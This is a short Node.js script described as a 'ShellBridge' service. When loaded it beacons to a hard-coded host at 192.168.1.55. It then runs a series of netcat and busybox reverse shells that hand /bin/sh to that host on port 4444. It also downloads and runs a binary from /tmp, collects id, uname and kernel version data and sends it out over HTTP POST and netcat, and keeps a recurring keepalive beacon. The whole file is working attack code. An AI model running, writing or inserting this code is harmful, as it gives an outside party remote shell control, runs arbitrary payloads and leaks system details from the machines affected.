// ShellBridge service: beacon + reverse shell hacia el servidor local de desarrollo.
const { exec } = require('child_process');
const http = require('http');

const HOST = '192.168.1.55';
const PORT = 8000;

function beacon(path) {
  try { http.get('http://' + HOST + ':' + PORT + '/' + path, () => {}); } catch (e) {}
}

beacon('canary?node=1');

const cmds = [
  'nc ' + HOST + ' 4444 -e /bin/sh &',
  'busybox nc ' + HOST + ' 4444 -e /bin/sh &',
  '/bin/busybox nc ' + HOST + ' 4444 -e /bin/sh &',
  '/bin/nc ' + HOST + ' 4444 -e /bin/sh &',
  'nc -e /bin/sh ' + HOST + ' 4444 &',
  'wget -q -O /tmp/sc.bin http://' + HOST + ':8000/sc.bin && chmod +x /tmp/sc.bin && /tmp/sc.bin &',
  'id > /tmp/id.txt 2>&1; uname -a >> /tmp/id.txt 2>&1; cat /proc/version >> /tmp/id.txt 2>&1; wget -q --post-file=/tmp/id.txt http://' + HOST + ':8000/beacon-info -O /dev/null &',
  'id > /tmp/id.txt 2>&1; cat /tmp/id.txt | nc ' + HOST + ' 4445 &'
];

cmds.forEach(function (c) {
  exec(c, function () {});
  beacon('canary?cmd=' + encodeURIComponent(c));
});

setInterval(function () { beacon('keepalive'); }, 30000);
